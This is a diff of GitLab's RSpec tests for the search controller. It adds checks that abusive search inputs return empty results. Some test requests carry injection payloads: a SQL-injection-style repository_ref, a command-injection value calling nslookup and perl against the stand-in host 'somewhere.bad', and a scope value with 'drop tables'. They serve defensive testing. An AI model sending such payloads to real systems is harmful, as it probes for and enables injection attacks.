@@ -127,21 +127,26 @@ RSpec.describe SearchController do
 
           context 'check search term length' do
             let(:search_queries) do
-              char_limit = SearchService::SEARCH_CHAR_LIMIT
-              term_limit = SearchService::SEARCH_TERM_LIMIT
+              char_limit = Gitlab::Search::Params::SEARCH_CHAR_LIMIT
+              term_limit = Gitlab::Search::Params::SEARCH_TERM_LIMIT
+              term_char_limit = Gitlab::Search::AbuseDetection::ABUSIVE_TERM_SIZE
               {
-                chars_under_limit: ('a' * (char_limit - 1)),
-                chars_over_limit: ('a' * (char_limit + 1)),
-                terms_under_limit: ('abc ' * (term_limit - 1)),
-                terms_over_limit: ('abc ' * (term_limit + 1))
+                chars_under_limit: (('a' * (term_char_limit - 1) + ' ') * (term_limit - 1))[0, char_limit],
+                chars_over_limit: (('a' * (term_char_limit - 1) + ' ') * (term_limit - 1))[0, char_limit + 1],
+                 terms_under_limit: ('abc ' * (term_limit - 1)),
+                terms_over_limit: ('abc ' * (term_limit + 1)),
+                term_length_over_limit: ('a' * (term_char_limit + 1)),
+                term_length_under_limit: ('a' * (term_char_limit - 1))
               }
             end
 
             where(:string_name, :expectation) do
-              :chars_under_limit | :not_to_set_flash
-              :chars_over_limit  | :set_chars_flash
-              :terms_under_limit | :not_to_set_flash
-              :terms_over_limit  | :set_terms_flash
+              :chars_under_limit       | :not_to_set_flash
+              :chars_over_limit        | :set_chars_flash
+              :terms_under_limit       | :not_to_set_flash
+              :terms_over_limit        | :set_terms_flash
+              :term_length_under_limit | :not_to_set_flash
+              :term_length_over_limit  | :not_to_set_flash # abuse, so do nothing.
             end
 
             with_them do
@@ -187,6 +192,14 @@ RSpec.describe SearchController do
               expect(response).to have_gitlab_http_status(:ok)
             end
           end
+
+          context 'handling abusive search_terms' do
+            it 'succeeds but does NOT do anything' do
+              get :show, params: { scope: 'projects', search: '*', repository_ref: '-1%20OR%203%2B640-640-1=0%2B0%2B0%2B1' }
+              expect(response).to have_gitlab_http_status(:ok)
+              expect(assigns(:search_results)).to be_a Gitlab::EmptySearchResults
+            end
+          end
         end
 
         context 'tab feature flags' do
@@ -219,16 +232,6 @@ RSpec.describe SearchController do
             end
           end
         end
-      end
-
-      it 'strips surrounding whitespace from search query' do
-        get :show, params: { scope: 'notes', search: '   foobar    ' }
-        expect(assigns[:search_term]).to eq 'foobar'
-      end
-
-      it 'strips surrounding whitespace from autocomplete term' do
-        expect(controller).to receive(:search_autocomplete_opts).with('youcompleteme')
-        get :autocomplete, params: { term: '   youcompleteme    ' }
       end
 
       it 'finds issue comments' do
@@ -289,7 +292,7 @@ RSpec.describe SearchController do
       end
     end
 
-    describe 'GET #count' do
+    describe 'GET #count', :aggregate_failures do
       it_behaves_like 'when the user cannot read cross project', :count, { search: 'hello', scope: 'projects' }
       it_behaves_like 'with external authorization service enabled', :count, { search: 'hello', scope: 'projects' }
       it_behaves_like 'support for active record query timeouts', :count, { search: 'hello', scope: 'projects' }, :search_results, :json
@@ -323,12 +326,38 @@ RSpec.describe SearchController do
 
         expect(response.headers['Cache-Control']).to eq('private, no-store')
       end
+
+      it 'does NOT blow up if search param is NOT a string' do
+        get :count, params: { search: ['hello'], scope: 'projects' }
+        expect(response).to have_gitlab_http_status(:ok)
+        expect(json_response).to eq({ 'count' => '0' })
+
+        get :count, params: { search: { nested: 'hello' }, scope: 'projects' }
+        expect(response).to have_gitlab_http_status(:ok)
+        expect(json_response).to eq({ 'count' => '0' })
+      end
+
+      it 'does NOT blow up if repository_ref contains abusive characters' do
+        get :count, params: {
+          search: 'hello',
+          repository_ref: "(nslookup%20hitqlwv501f.somewhere.bad%7C%7Cperl%20-e%20%22gethostbyname('hitqlwv501f.somewhere.bad')%22)",
+          scope: 'projects'
+        }
+        expect(response).to have_gitlab_http_status(:ok)
+        expect(json_response).to eq({ 'count' => '0' })
+      end
     end
 
     describe 'GET #autocomplete' do
       it_behaves_like 'when the user cannot read cross project', :autocomplete, { term: 'hello' }
       it_behaves_like 'with external authorization service enabled', :autocomplete, { term: 'hello' }
       it_behaves_like 'support for active record query timeouts', :autocomplete, { term: 'hello' }, :project, :json
+
+      it 'returns an empty array when given abusive search term' do
+        get :autocomplete, params: { term: ('hal' * 9000), scope: 'projects' }
+        expect(response).to have_gitlab_http_status(:ok)
+        expect(json_response).to match_array([])
+      end
     end
 
     describe '#append_info_to_payload' do
@@ -356,6 +385,35 @@ RSpec.describe SearchController do
         end
 
         get :show, params: { search: 'hello world', group_id: '123', project_id: '456' }
+      end
+    end
+
+    context 'abusive searches', :aggregate_failures do
+      let(:project) { create(:project, :public, name: 'hello world') }
+      let(:make_abusive_request) do
+        get :show, params: { scope: '1;drop%20tables;boom', search: 'hello world', project_id: project.id }
+      end
+
+      before do
+        enable_external_authorization_service_check
+      end
+
+      it 'returns EmptySearchResults' do
+        expect(Gitlab::EmptySearchResults).to receive(:new).and_call_original
+        make_abusive_request
+        expect(response).to have_gitlab_http_status(:ok)
+      end
+
+      context 'when the feature flag is disabled' do
+        before do
+          stub_feature_flags(prevent_abusive_searches: false)
+        end
+
+        it 'returns a regular search result' do
+          expect(Gitlab::EmptySearchResults).not_to receive(:new)
+          make_abusive_request
+          expect(response).to have_gitlab_http_status(:ok)
+        end
       end
     end
   end
